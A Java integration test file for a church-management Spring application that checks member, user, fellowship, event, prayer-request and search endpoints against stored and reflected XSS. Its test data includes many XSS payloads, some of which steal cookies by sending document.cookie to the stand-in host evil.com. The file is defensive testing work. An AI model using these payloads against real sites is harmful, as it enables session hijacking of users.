package com.reuben.pastcare_spring.security;

import com.reuben.pastcare_spring.integration.BaseIntegrationTest;
import com.reuben.pastcare_spring.enums.Role;
import io.restassured.response.Response;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Nested;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;

import java.util.HashMap;
import java.util.Map;

import static io.restassured.RestAssured.given;
import static org.assertj.core.api.Assertions.assertThat;

/**
 * Security Tests: Cross-Site Scripting (XSS) Prevention
 *
 * Verifies that the application properly sanitizes user input to prevent
 * XSS attacks. Tests both stored XSS and reflected XSS scenarios.
 *
 * Tests cover:
 * - Member name fields
 * - User profile fields
 * - Fellowship descriptions
 * - Event descriptions
 * - Notes and comments
 * - Search parameters (reflected XSS)
 *
 * ALL user roles are tested to ensure consistent protection.
 */
@DisplayName("XSS Prevention Tests")
public class XssPreventionTest extends BaseIntegrationTest {

    private Long testChurchId;
    private Map<Role, String> roleTokens = new HashMap<>();

    @BeforeEach
    void setUp() {
        // Create test church with unique name to avoid conflicts in parameterized tests
        testChurchId = createTestChurch("XSS Test Church " + System.currentTimeMillis() + "_" + Thread.currentThread().getId());

        // Create tokens for each role
        roleTokens.put(Role.ADMIN, getAdminToken(testChurchId));
        roleTokens.put(Role.PASTOR, getPastorToken(testChurchId));
        roleTokens.put(Role.TREASURER, getTreasurerToken(testChurchId));
        roleTokens.put(Role.MEMBER_MANAGER, getMemberManagerToken(testChurchId));
        roleTokens.put(Role.FELLOWSHIP_LEADER, getFellowshipLeaderToken(testChurchId));
        roleTokens.put(Role.MEMBER, getMemberToken(testChurchId));
        roleTokens.put(Role.SUPERADMIN, getSuperadminToken());
    }

    // ==================== MEMBER XSS PREVENTION ====================

    @Nested
    @DisplayName("Member Fields XSS Prevention")
    class MemberFieldsXss {

        @ParameterizedTest
        @ValueSource(strings = {
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src='javascript:alert(1)'></iframe>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "'\"><script>alert('XSS')</script>",
            "<a href=\"javascript:alert('XSS')\">Click</a>",
            "<div style=\"background:url(javascript:alert('XSS'))\">",
            "{{constructor.constructor('alert(1)')()}}"
        })
        @DisplayName("XSS-001: Member first name field sanitizes XSS payloads")
        void memberFirstNameSanitizesXss(String xssPayload) {
            Map<String, Object> memberRequest = new HashMap<>();
            memberRequest.put("firstName", xssPayload);
            memberRequest.put("lastName", "TestMember");
            memberRequest.put("email", "member" + System.currentTimeMillis() + "@test.com");

            Response response = given()
                .spec(authenticatedSpec(roleTokens.get(Role.ADMIN)))
                .body(memberRequest)
            .when()
                .post("/api/members")
            .then()
                .extract().response();

            // If created, verify the stored value is sanitized or escaped
            if (response.statusCode() == 201) {
                String storedFirstName = response.jsonPath().getString("firstName");

                // Script tags should be escaped or stripped
                assertThat(storedFirstName)
                    .doesNotContain("<script>")
                    .doesNotContain("javascript:");

                // Or if stored literally, verify it's properly escaped in JSON
                String rawResponse = response.asString();
                if (rawResponse.contains("script")) {
                    // Should be escaped in JSON response
                    assertThat(rawResponse).doesNotContain("<script>");
                }
            }
        }

        @ParameterizedTest
        @ValueSource(strings = {
            "<script>document.location='http://evil.com?c='+document.cookie</script>",
            "<img src=x onerror='fetch(\"http://evil.com/\"+document.cookie)'>",
            "<svg/onload=fetch('http://evil.com?'+document.cookie)>"
        })
        @DisplayName("XSS-002: Member last name field sanitizes cookie-stealing XSS")
        void memberLastNameSanitizesCookieXss(String xssPayload) {
            Map<String, Object> memberRequest = new HashMap<>();
            memberRequest.put("firstName", "Test");
            memberRequest.put("lastName", xssPayload);
            memberRequest.put("email", "member" + System.currentTimeMillis() + "@test.com");

            Response response = given()
                .spec(authenticatedSpec(roleTokens.get(Role.ADMIN)))
                .body(memberRequest)
            .when()
                .post("/api/members")
            .then()
                .extract().response();

            if (response.statusCode() == 201) {
                String storedLastName = response.jsonPath().getString("lastName");
                assertThat(storedLastName)
                    .doesNotContain("<script>")
                    .doesNotContain("document.cookie")
                    .doesNotContain("onerror=")
                    .doesNotContain("onload=");
            }
        }

        @Test
        @DisplayName("XSS-003: All roles - Member creation sanitizes XSS")
        void allRolesMemberCreationSanitizesXss() {
            String xssPayload = "<script>alert('XSS')</script>";

            // Test with roles that can create members
            for (Role role : new Role[]{Role.ADMIN, Role.MEMBER_MANAGER}) {
                Map<String, Object> memberRequest = new HashMap<>();
                memberRequest.put("firstName", xssPayload);
                memberRequest.put("lastName", "Test");
                memberRequest.put("email", "member" + System.currentTimeMillis() + "@test.com");

                Response response = given()
                    .spec(authenticatedSpec(roleTokens.get(role)))
                    .body(memberRequest)
                .when()
                    .post("/api/members")
                .then()
                    .extract().response();

                if (response.statusCode() == 201) {
                    assertThat(response.asString())
                        .as("Role %s should sanitize XSS", role.name())
                        .doesNotContain("<script>");
                }
            }
        }
    }

    // ==================== USER XSS PREVENTION ====================

    @Nested
    @DisplayName("User Fields XSS Prevention")
    class UserFieldsXss {

        @ParameterizedTest
        @ValueSource(strings = {
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>"
        })
        @DisplayName("XSS-004: User name field sanitizes XSS payloads")
        void userNameSanitizesXss(String xssPayload) {
            Map<String, Object> userRequest = new HashMap<>();
            userRequest.put("name", xssPayload);
            userRequest.put("email", "user" + System.currentTimeMillis() + "@test.com");
            userRequest.put("password", "SecurePass123!");
            userRequest.put("role", "PASTOR");

            Response response = given()
                .spec(authenticatedSpec(roleTokens.get(Role.ADMIN)))
                .body(userRequest)
            .when()
                .post("/api/users")
            .then()
                .extract().response();

            if (response.statusCode() == 201) {
                String storedName = response.jsonPath().getString("name");
                assertThat(storedName)
                    .doesNotContain("<script>")
                    .doesNotContain("onerror=")
                    .doesNotContain("onload=");
            }
        }

        @Test
        @DisplayName("XSS-005: User title field sanitizes XSS payloads")
        void userTitleSanitizesXss() {
            String xssPayload = "<script>alert('XSS')</script>Senior Pastor";

            Map<String, Object> userRequest = new HashMap<>();
            userRequest.put("name", "Test User");
            userRequest.put("email", "user" + System.currentTimeMillis() + "@test.com");
            userRequest.put("password", "SecurePass123!");
            userRequest.put("role", "PASTOR");
            userRequest.put("title", xssPayload);

            Response response = given()
                .spec(authenticatedSpec(roleTokens.get(Role.ADMIN)))
                .body(userRequest)
            .when()
                .post("/api/users")
            .then()
                .extract().response();

            if (response.statusCode() == 201) {
                String rawResponse = response.asString();
                assertThat(rawResponse).doesNotContain("<script>");
            }
        }
    }

    // ==================== FELLOWSHIP XSS PREVENTION ====================

    @Nested
    @DisplayName("Fellowship Fields XSS Prevention")
    class FellowshipFieldsXss {

        @ParameterizedTest
        @ValueSource(strings = {
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<a href='javascript:alert(1)'>Click me</a>"
        })
        @DisplayName("XSS-006: Fellowship name field sanitizes XSS payloads")
        void fellowshipNameSanitizesXss(String xssPayload) {
            Map<String, Object> fellowshipRequest = new HashMap<>();
            fellowshipRequest.put("name", xssPayload);
            fellowshipRequest.put("description", "Test fellowship");

            Response response = given()
                .spec(authenticatedSpec(roleTokens.get(Role.ADMIN)))
                .body(fellowshipRequest)
            .when()
                .post("/api/fellowships")
            .then()
                .extract().response();

            if (response.statusCode() == 201) {
                assertThat(response.asString())
                    .doesNotContain("<script>")
                    .doesNotContain("javascript:");
            }
        }

        @ParameterizedTest
        @ValueSource(strings = {
            "This is a fellowship <script>alert('XSS')</script> description",
            "Description with <img src=x onerror=alert('XSS')> image",
            "Check out <a href='javascript:evil()'>this link</a>"
        })
        @DisplayName("XSS-007: Fellowship description field sanitizes XSS payloads")
        void fellowshipDescriptionSanitizesXss(String xssPayload) {
            Map<String, Object> fellowshipRequest = new HashMap<>();
            fellowshipRequest.put("name", "Test Fellowship " + System.currentTimeMillis());
            fellowshipRequest.put("description", xssPayload);

            Response response = given()
                .spec(authenticatedSpec(roleTokens.get(Role.ADMIN)))
                .body(fellowshipRequest)
            .when()
                .post("/api/fellowships")
            .then()
                .extract().response();

            if (response.statusCode() == 201) {
                assertThat(response.asString())
                    .doesNotContain("<script>")
                    .doesNotContain("onerror=")
                    .doesNotContain("javascript:");
            }
        }
    }

    // ==================== REFLECTED XSS PREVENTION ====================

    @Nested
    @DisplayName("Reflected XSS Prevention")
    class ReflectedXss {

        @ParameterizedTest
        @ValueSource(strings = {
            "<script>alert('XSS')</script>",
            "'\"><script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>"
        })
        @DisplayName("XSS-008: Search query parameter does not reflect XSS")
        void searchQueryDoesNotReflectXss(String xssPayload) {
            Response response = given()
                .spec(authenticatedSpec(roleTokens.get(Role.ADMIN)))
                .queryParam("search", xssPayload)
            .when()
                .get("/api/members")
            .then()
                .extract().response();

            // The XSS payload should NOT appear unescaped in the response
            String body = response.asString();
            assertThat(body)
                .doesNotContain("<script>")
                .doesNotContain("onerror=");
        }

        @Test
        @DisplayName("XSS-009: Error messages do not reflect XSS payloads")
        void errorMessagesDoNotReflectXss() {
            String xssPayload = "<script>alert('XSS')</script>";

            // Try to trigger an error with XSS in the request
            Response response = given()
                .spec(authenticatedSpec(roleTokens.get(Role.ADMIN)))
            .when()
                .get("/api/users/" + xssPayload)
            .then()
                .extract().response();

            // Error message should not reflect the XSS payload
            assertThat(response.asString()).doesNotContain("<script>");
        }

        @Test
        @DisplayName("XSS-010: All roles - Search does not reflect XSS")
        void allRolesSearchDoesNotReflectXss() {
            String xssPayload = "<script>alert('XSS')</script>";

            for (Role role : roleTokens.keySet()) {
                Response response = given()
                    .spec(authenticatedSpec(roleTokens.get(role)))
                    .queryParam("q", xssPayload)
                .when()
                    .get("/api/members")
                .then()
                    .extract().response();

                assertThat(response.asString())
                    .as("Role %s search should not reflect XSS", role.name())
                    .doesNotContain("<script>");
            }
        }
    }

    // ==================== EVENT XSS PREVENTION ====================

    @Nested
    @DisplayName("Event Fields XSS Prevention")
    class EventFieldsXss {

        @ParameterizedTest
        @ValueSource(strings = {
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')"
        })
        @DisplayName("XSS-011: Event name field sanitizes XSS payloads")
        void eventNameSanitizesXss(String xssPayload) {
            Map<String, Object> eventRequest = new HashMap<>();
            eventRequest.put("name", xssPayload);
            eventRequest.put("description", "Test event");
            eventRequest.put("eventDate", "2025-01-15");
            eventRequest.put("eventTime", "10:00");

            Response response = given()
                .spec(authenticatedSpec(roleTokens.get(Role.ADMIN)))
                .body(eventRequest)
            .when()
                .post("/api/events")
            .then()
                .extract().response();

            if (response.statusCode() == 201) {
                assertThat(response.asString())
                    .doesNotContain("<script>")
                    .doesNotContain("onerror=")
                    .doesNotContain("javascript:");
            }
        }

        @Test
        @DisplayName("XSS-012: Event description field sanitizes XSS payloads")
        void eventDescriptionSanitizesXss() {
            String xssPayload = "Join us for worship! <script>document.location='http://evil.com'</script>";

            Map<String, Object> eventRequest = new HashMap<>();
            eventRequest.put("name", "Sunday Service " + System.currentTimeMillis());
            eventRequest.put("description", xssPayload);
            eventRequest.put("eventDate", "2025-01-15");
            eventRequest.put("eventTime", "10:00");

            Response response = given()
                .spec(authenticatedSpec(roleTokens.get(Role.ADMIN)))
                .body(eventRequest)
            .when()
                .post("/api/events")
            .then()
                .extract().response();

            if (response.statusCode() == 201) {
                assertThat(response.asString())
                    .doesNotContain("<script>")
                    .doesNotContain("document.location");
            }
        }
    }

    // ==================== CARE NEEDS XSS PREVENTION ====================

    @Nested
    @DisplayName("Care Needs Fields XSS Prevention")
    class CareNeedsXss {

        @Test
        @DisplayName("XSS-013: Care need description sanitizes XSS payloads")
        void careNeedDescriptionSanitizesXss() {
            String xssPayload = "Prayer request <script>alert('XSS')</script> for healing";

            Map<String, Object> careNeedRequest = new HashMap<>();
            careNeedRequest.put("type", "PRAYER");
            careNeedRequest.put("description", xssPayload);

            Response response = given()
                .spec(authenticatedSpec(roleTokens.get(Role.PASTOR)))
                .body(careNeedRequest)
            .when()
                .post("/api/care-needs")
            .then()
                .extract().response();

            if (response.statusCode() == 201) {
                assertThat(response.asString()).doesNotContain("<script>");
            }
        }

        @Test
        @DisplayName("XSS-014: Prayer request content sanitizes XSS payloads")
        void prayerRequestSanitizesXss() {
            String xssPayload = "Please pray <img src=x onerror=alert('XSS')> for my family";

            Map<String, Object> prayerRequest = new HashMap<>();
            prayerRequest.put("content", xssPayload);
            prayerRequest.put("isAnonymous", false);

            Response response = given()
                .spec(authenticatedSpec(roleTokens.get(Role.MEMBER)))
                .body(prayerRequest)
            .when()
                .post("/api/prayer-requests")
            .then()
                .extract().response();

            if (response.statusCode() == 201) {
                assertThat(response.asString())
                    .doesNotContain("<img")
                    .doesNotContain("onerror=");
            }
        }
    }

    // ==================== COMPREHENSIVE XSS TEST ====================

    @Nested
    @DisplayName("Comprehensive XSS Prevention")
    class ComprehensiveXss {

        @Test
        @DisplayName("XSS-015: API responses have proper Content-Type to prevent XSS execution")
        void apiResponsesHaveProperContentType() {
            // For REST APIs, XSS prevention is primarily about:
            // 1. Returning proper Content-Type (application/json) to prevent browser execution
            // 2. Client-side output encoding when rendering
            // Data stored with special characters is fine as long as JSON encoding is correct

            String xssPayload = "<script>alert('test')</script>";

            // Test multiple endpoints with XSS payloads
            String[] createEndpoints = {"/api/members", "/api/users", "/api/fellowships"};

            for (String endpoint : createEndpoints) {
                Map<String, Object> request = new HashMap<>();
                request.put("name", xssPayload);
                request.put("firstName", xssPayload);
                request.put("lastName", "Test");
                request.put("email", "test" + System.currentTimeMillis() + "@test.com");
                request.put("password", "SecurePass123!");
                request.put("role", "PASTOR");
                request.put("description", xssPayload);

                try {
                    Response response = given()
                        .spec(authenticatedSpec(roleTokens.get(Role.ADMIN)))
                        .body(request)
                    .when()
                        .post(endpoint)
                    .then()
                        .extract().response();

                    // Verify Content-Type is JSON (prevents browser from executing scripts)
                    String contentType = response.getContentType();
                    assertThat(contentType)
                        .as("Endpoint %s should return JSON Content-Type", endpoint)
                        .containsIgnoringCase("application/json");

                } catch (Exception e) {
                    // Endpoint might not exist or reject request, that's OK
                }
            }
        }
    }
}
